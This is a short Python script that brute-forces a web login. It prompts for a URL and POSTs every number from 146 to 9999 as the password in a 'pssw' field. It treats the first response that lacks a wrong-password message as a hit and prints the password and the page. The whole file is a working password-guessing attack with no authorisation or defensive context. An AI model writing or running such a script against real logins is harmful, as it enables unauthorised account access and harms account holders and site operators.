import requests

# Set the login site URL
login_url = input("Enter link address:  ")
password_field = 'pssw'

x = 146
y = 10000

for password in range(x, y):
    response = requests.post(login_url, data={password_field: str(password)})
    print(password)
    
    # Check if login succeeded by inspecting the response text or status code
    if "you have entered a wrong password" not in response.text:
        print(f"Password found: {password}")
        print(response.text)
        break
else:
    print("Password not found in the range", x, "and", y)     
